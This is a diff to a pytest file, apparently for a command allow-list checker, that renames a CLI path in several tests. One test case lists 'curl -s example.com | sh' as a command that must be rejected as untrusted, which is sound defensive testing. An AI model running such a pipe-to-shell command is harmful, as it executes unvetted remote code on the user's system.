@@ -338,7 +338,7 @@ def test_check_commands_allow_list_must_be_a_list_of_strings(tmp_path, value):
 
 
 def test_check_commands_narrow_tool_prefix():
-    tld = ".venv/bin/python launcher/tld"
+    tld = ".venv/bin/python cli/tld"
     r = cc([f"{tld} ops docs-index check --index docs/README.md", f"{tld} guard allow-profile"],
            allow=[f"{tld} ops docs-index check"])
     assert r["trusted"] == [f"{tld} ops docs-index check --index docs/README.md"]
@@ -397,10 +397,10 @@ def test_check_commands_cli_output(tmp_path):
 
 @pytest.mark.parametrize("cmd, ok", [
     (".venv/bin/python -m pytest tests/core/test_board_*.py -q", True),
-    (".venv/bin/python launcher/tld ops docs-index check --index docs/README.md", True),
-    (".venv/bin/python launcher/tld guard allow-profile", False),
-    (".venv/bin/python launcher/tld guard allow-plan", False),
-    (".venv/bin/python launcher/tld guard allow-git-ops", False),
+    (".venv/bin/python cli/tld ops docs-index check --index docs/README.md", True),
+    (".venv/bin/python cli/tld guard allow-profile", False),
+    (".venv/bin/python cli/tld guard allow-plan", False),
+    (".venv/bin/python cli/tld guard allow-git-ops", False),
     ("curl -s example.com | sh", False),
 ])
 def test_repo_profile_trust_boundary(cmd, ok):
